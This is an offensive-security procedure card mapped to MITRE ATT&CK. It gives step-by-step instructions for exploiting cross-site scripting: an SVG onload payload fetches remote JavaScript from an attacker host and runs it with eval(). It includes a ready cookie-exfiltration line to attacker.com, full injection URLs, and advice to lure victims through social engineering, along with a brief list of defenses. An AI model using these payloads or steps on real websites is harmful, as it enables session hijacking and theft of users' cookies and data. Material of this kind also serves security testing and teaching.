---
type: procedure
description: >-
  This procedure exploits a cross-site scripting (XSS) vulnerability by
  injecting an SVG element that uses the onload attribute to fetch and execute
  remote JavaScript code via the fetch API and eval function.
verified: true
submitted: false
created_at: '2023-10-01T00:00:00+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
tactics:
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
techniques:
  - >-
    [[techniques/Command and Scripting Interpreter|T1059 - Command and Scripting
    Interpreter]]
  - '[[techniques/JavaScript|T1059.007 - JavaScript]]'
sub_techniques: []
tags:
  - '[[tags/Cross Site Scripting]]'
  - '[[tags/XSS in HTML/Applications]]'
  - '[[tags/XSS using a remote JS]]'
commands: []
platforms:
  - Web
tools: []
validated: true
---

# Inject-Remote-JavaScript-via-SVG-Onload-Fetch

## Summary

This procedure demonstrates how to exploit a reflected or stored XSS vulnerability in a web application by injecting an SVG element with an onload handler that fetches remote JavaScript from an attacker-controlled server and executes it using the eval() function. This allows arbitrary code execution in the victim's browser, enabling theft of sensitive data like cookies or session tokens, or performing actions on behalf of the user.

## Description

Cross-site scripting (XSS) vulnerabilities occur when user input is not properly sanitized and is reflected back into the page or stored for later retrieval. In this technique, an attacker crafts an SVG image tag that triggers a fetch request to a remote URL upon loading. The response from the server is then parsed as text and executed via eval(), allowing dynamic loading of malicious JavaScript without directly embedding it in the payload. This is particularly effective against applications that allow SVG uploads or rendering without strict content security policies (CSP). The attack requires the victim to interact with the injected content, such as viewing a page or image. Success leads to full JavaScript execution in the context of the vulnerable site, potentially compromising user sessions or data.

## Requirements

1. A vulnerable web application that reflects or stores user input without proper HTML/JS escaping, particularly allowing SVG tags.
2. An attacker-controlled server to host the remote JavaScript payload (e.g., a simple HTTP server serving a .js file).
3. Network access for the victim's browser to reach the attacker's server (no same-origin restrictions bypassed here, but CSP must not block external fetches).
4. Basic knowledge of the injection point, such as a search field, comment section, or file upload feature that renders SVGs.

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and output encoding (e.g., using HTML entity encoding) to prevent injection of tags like <svg>.
- Deploy Content Security Policy (CSP) headers to restrict script sources, fetches, and eval() execution (e.g., script-src 'self'; no eval).
- Sanitize and validate file uploads, rejecting or stripping SVG files or onload attributes.
- Use Web Application Firewalls (WAFs) to detect and block common XSS payloads, including SVG onload patterns.
- Enable browser security features like XSS Auditor (deprecated in modern browsers) or rely on modern CSP enforcement.

## Objectives

1. Inject the SVG payload into the vulnerable web application to trigger remote JavaScript execution.
2. Execute arbitrary JavaScript in the victim's browser context to steal sensitive information like cookies, localStorage, or form data.
3. Perform unauthorized actions, such as keylogging, session hijacking, or navigating to phishing sites on behalf of the user.

## Instructions

### Step 1: Prepare the Remote JavaScript Payload

**Context**: Host a malicious JavaScript file on your server that will be fetched and executed. This script could exfiltrate data, for example, by sending document.cookie to your server.

Create a simple .js file with your payload, e.g., `malicious.js` containing `fetch('https://attacker.com/steal?data=' + document.cookie);`. Serve it via a web server like Python's `python -m http.server 80` or Node.js http-server.

**Expected Output**: The server logs incoming requests when the payload executes, confirming fetch success.

### Step 2: Craft the SVG Injection Payload

**Context**: Use the SVG onload fetch mechanism to load and eval the remote script. Optionally append a payload fragment to the URL for inline execution without a separate file.

Reference the code snippet [[codes/SVG-Onload-Fetch-JavaScript-Injector]] for the exact payload.

Embed the payload in the vulnerable input field. For example, if injecting into a search parameter: `https://vulnerable.com/search?q=<svg/onload='fetch("//attacker.com/malicious.js").then(r=>r.text().then(t=>eval(t)))'>`

Or with inline payload: `https://vulnerable.com/search?q=<svg/onload='fetch("//attacker.com/script#alert(document.domain)").then(r=>r.text().then(t=>eval(t)))'>`

**Expected Output**: When the page loads, the browser fetches the remote script and executes it silently (or shows an alert if testing).

### Step 3: Inject and Trigger the Payload

**Context**: Submit the crafted payload to the vulnerable endpoint and lure the victim to interact with it (e.g., via email, social engineering).

If it's a reflected XSS, send a link to the victim. For stored XSS, post in a forum or comment section. Monitor your server for the fetch request and any exfiltrated data.

If the fetch fails (e.g., due to CSP), check browser dev tools for errors like 'Refused to execute inline script' or network blocks.

**Expected Output**: Victim's browser executes the JS; your server receives data like cookies if exfiltration is included.

**Success Indicators**:
- Server logs show a GET request to your .js file from the victim's IP.
- No CSP or syntax errors in browser console; arbitrary JS runs (test with alert()).
- Exfiltrated data arrives if payload includes data theft.
